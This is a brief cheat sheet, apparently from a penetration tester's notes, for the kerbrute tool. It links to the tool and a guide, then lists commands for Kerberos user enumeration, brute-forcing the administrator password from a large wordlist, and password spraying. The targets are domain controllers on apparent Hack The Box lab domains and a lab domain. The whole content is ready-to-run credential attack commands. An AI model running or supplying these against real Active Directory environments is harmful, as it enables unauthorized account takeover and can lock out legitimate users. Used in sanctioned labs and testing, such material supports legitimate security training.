https://github.com/ropnop/kerbrute
https://hackingarticles.in/a-detailed-guide-on-kerbrute/

```bash
# User Enumeration
./kerbrute userenum --dc dc01.ghost.htb -d ghost.htb ~/wordlists/wordlists/SecLists/Usernames/top-usernames-shortlist.txt

./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt

# Bruteforce
./kerbrute bruteuser --dc dc01.ghost.htb -d ghost.htb ~/wordlists/wordlists/SecLists/Passwords/xato-net-10-million-passwords-10000.txt administrator

# Password Spray
./kerbrute passwordspray --dc dc01.infiltrator.htb -d infiltrator.htb users.txt 'WAT?watismypass!'

./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123
```